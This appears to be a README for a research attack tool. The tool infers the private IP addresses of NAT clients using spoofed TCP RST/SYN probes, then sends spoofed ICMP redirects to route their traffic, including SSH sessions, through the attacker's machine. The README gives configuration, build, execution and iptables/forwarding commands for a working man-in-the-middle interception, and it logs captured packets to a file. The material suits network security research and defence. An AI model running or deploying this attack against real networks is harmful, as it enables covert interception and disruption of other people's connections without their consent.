# Private IP Inference via ICMP Redirect

This tool infers private IP addresses of clients behind a NAT that have active TCP
connections to a target server, then intercepts their outbound traffic using ICMP redirect packets.

It extends the private IP inference technique of Sharma et al. [1]: instead of
terminating the victim's connection, it sends spoofed ICMP redirect messages to
silently redirect the victim's traffic through the attacker's machine.

### Citation

If you use this code, please cite:

```bibtex
@misc{cryptoeprint:2026/149,
  author = {Suraj Sharma and Adityavir Singh and Mahabir Prasad Jhanwar},
  title = {Private {IP} Address Inference in {NAT} Networks via Off-Path {TCP} Control-Plane Attack},
  howpublished = {Cryptology {ePrint} Archive, Paper 2026/149},
  year = {2026},
  url = {https://eprint.iacr.org/2026/149}
}
```

`port_infer.py` is taken directly from the Sharma et al. repository [1].

---

## Attack Overview

The attack runs in two stages:

**Stage 1 — Port inference (`port_infer.py`)**: Identifies which ephemeral source ports
at the NAT are currently in use by active TCP connections to the target server.

**Stage 2 — IP inference + ICMP redirect (`attack_s` / `attack_p`)**: For each active
port, divides the candidate private IP subnet into blocks and probes each block using
spoofed RST packets followed by a SYN probe. A challenge-ACK (c-ACK) response from the
server identifies the block containing the active client and reveals the correct TCP
sequence number. An ICMP redirect (type 5, code 1) is then sent to every IP in the block,
causing the real client to reroute its traffic through the attacker.

### NAT Behaviors Exploited

- **Port preservation** — NAT preserves the client's source port on the WAN side.
- **No TCP window tracking for RST** — NAT forwards spoofed RSTs regardless of sequence number.
- **No reverse path validation** — NAT forwards packets from LAN IPs it does not own.

---

## Prerequisites

### System Requirements

- Linux (tested on Ubuntu 24.04)
- Root access (required for raw packet injection and sniffing)

### Dependencies

#### Scapy (for `port_infer.py`)

```bash
sudo apt update
sudo apt install python3-scapy
```

Or via pip inside a virtual environment:

```bash
pip install scapy
```

#### libpcap (for `attack_s` / `attack_p`)

```bash
sudo apt install libpcap-dev
```

#### libtins (for `attack_s` / `attack_p`)

libtins is a high-level C++ packet crafting and sniffing library.

**Option A — from package manager (if available):**

```bash
sudo apt install libtins-dev
```

**Option B — build from source:**

```bash
sudo apt install cmake libpcap-dev libssl-dev
git clone https://github.com/mfontanini/libtins.git
cd libtins
mkdir build && cd build
cmake .. -DLIBTINS_ENABLE_CXX11=1
make -j$(nproc)
sudo make install
sudo ldconfig
```

libtins installs to `/usr/local` by default. If the linker cannot find it, add to your
library path:

```bash
export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH
```

---

## Configuration

Edit the `CONFIG` block at the top of `common.h` before building:

```cpp
const string   ATTACKER_IP      = "192.168.1.2";   // Attacker's private LAN IP
const string   SERVER_IP        = "20.0.0.5";       // Target server public IP
const uint16_t SERVER_PORT      = 22;               // Target server port
const string   GATEWAY_IP       = "192.168.1.1";   // Default gateway IP
const string   GATEWAY_MAC      = "aa:bb:cc:dd:ee:ff"; // Fallback MAC if ARP fails
const string   NEW_GW_IP        = "192.168.1.2";   // ICMP redirect new gateway (= attacker)
const string   REDIRECT_SRC_MAC = "";               // Eth src in redirect; empty = self MAC
const string   IFACE            = "eth0";           // Network interface
const int NAT_CLEAR_WAIT  = 11;   // Seconds after RST for NAT to clear (router-dependent)
const int SYN_WAIT        = 1;    // Seconds to wait for server response after SYN
const int INTER_BLOCK_WAIT = 1;   // Pause between blocks when no response
const int SNIFF_WAIT      = 10;   // Seconds to sniff for redirected traffic per session
```

`NAT_CLEAR_WAIT` is router-dependent. Empirically: ~1 s for Linksys E5600, ~10 s for
TP-Link Archer C6. Set it too low and the NAT still has the CLOSE-state entry — the
attacker's SYN gets remapped rather than reusing the victim's port.

---

## Build

```bash
make
```

Produces two binaries: `attack_s` (sequential) and `attack_p` (block-parallel).

---

## Execution

### Step 1 — Configure `port_infer.py`

Edit the config section at the top of `port_infer.py`:

```python
IFACE      = "eth0"           # Network interface
attacker_ip = "192.168.1.2"   # Attacker's private IP
server_ip   = "20.0.0.5"      # Target server IP
SERVER_PORT = 22               # Target server port
nat_ip      = "1.2.3.4"       # NAT public IP (WAN address)
```

### Step 2 — Infer active NAT ports

```bash
sudo python3 port_infer.py --live
```

Save the output to a file, one port per line:

```
44201
50000
60000
```

### Step 3 — Suppress kernel RST responses

The attacker opens raw sockets for SYN probes. Without this rule the kernel sends RST
in response to any SYN-ACK received, disrupting the probe:

```bash
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

### Step 4 — Run the attack

**Sequential (one port at a time, one block at a time):**

```bash
sudo ./attack_s --ports ports.txt --subnet 24
```

**Parallel (one thread per block, all ports probed simultaneously per block):**

```bash
sudo ./attack_p --ports ports.txt --subnet 24
```

**CLI options:**

| Option | Description | Default |
|---|---|---|
| `--ports <file>` | File with one active port per line | required |
| `--subnet <prefix>` | CIDR prefix to enumerate (e.g. `24`) | required |
| `--hosts <file>` | CSV `MAC,IP` file instead of subnet enumeration | — |
| `--block <k>` | IPs per block | 10 |
| `--nat-wait <s>` | Seconds after RST flood for NAT to clear | 11 |
| `--syn-wait <s>` | Seconds to wait for server response after SYN | 1 |
| `--block-wait <s>` | Pause between blocks on no-response (sequential only) | 1 |

### Step 5 — Observe captured traffic

Live output appears on the terminal as packets are intercepted:

```
[+12043ms] [CAPTURED] port=44201 192.168.1.13:44201 -> 20.0.0.5:22 flags=0x10 seq=... ack=...
```

All captured traffic is also appended to `captured.txt` in the working directory.

### Step 6 — Enable IP forwarding (optional)

To forward the intercepted traffic on to the real server (transparent interception):

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -P FORWARD ACCEPT
```

Verify with:

```bash
ip route get <SERVER_IP>   # must show route via gateway
```

### Step 7 — Clean up

```bash
sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Files

| File | Description |
|---|---|
| `port_infer.py` | Stage 1: infer active NAT source ports (from Sharma et al. [1]) |
| `common.h` | Shared config, helpers, packet functions, sniffer utilities |
| `attack_s.cpp` | Sequential attack: port by port, block by block |
| `attack_p.cpp` | Parallel attack: one thread per block, all ports per block |
| `Makefile` | Builds `attack_s` and `attack_p` |

---

## References

[1] Suraj Sharma, Adityavir Singh, Mahabir Prasad Jhanwar. *Private IP Address Inference
in NAT Networks via Off-Path TCP Control-Plane Attack*. Cryptology ePrint Archive,
Paper 2026/149. https://eprint.iacr.org/2026/149
